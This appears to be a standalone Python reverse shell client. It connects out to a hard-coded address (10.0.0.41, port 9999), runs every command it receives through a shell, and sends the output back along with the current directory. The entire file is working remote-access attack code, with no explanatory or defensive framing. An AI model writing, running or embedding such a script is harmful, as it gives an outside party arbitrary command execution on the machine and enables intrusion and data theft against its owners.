import os
import socket
import subprocess


s = socket.socket()
host = "10.0.0.41"
port = 9999
s.connect((host, port))


while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(str(data[3:], "utf-8", errors="ignore"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8", errors="ignore")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)


# Close connection
s.close()












